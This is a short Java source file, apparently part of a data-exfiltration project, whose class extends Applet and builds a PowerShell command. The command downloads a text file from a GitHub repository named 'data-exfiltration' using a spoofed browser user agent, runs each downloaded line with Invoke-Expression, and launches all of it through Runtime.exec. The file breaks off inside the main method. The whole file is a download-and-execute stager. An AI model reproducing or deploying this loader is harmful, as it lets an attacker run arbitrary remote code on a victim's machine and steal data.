import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.applet.Applet;
public class powershell extends Applet {

 public static void main(String[] args) throws IOException {

  //Put the command you want to execute here
  String command = "powershell.exe Invoke-WebRequest -URI https://raw.githubusercontent.com/eternal-red/data-exfiltration/main/powershell.txt -OutFile C:\\Temp\\test.txt -UserAgent \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36\"; foreach($line in [System.IO.File]::ReadLines(\"C:\\Temp\\test.txt\")) {Invoke-Expression $line});"
  // Executing the command
  Process powerShellProcess = Runtime.getRuntime().exec(command);  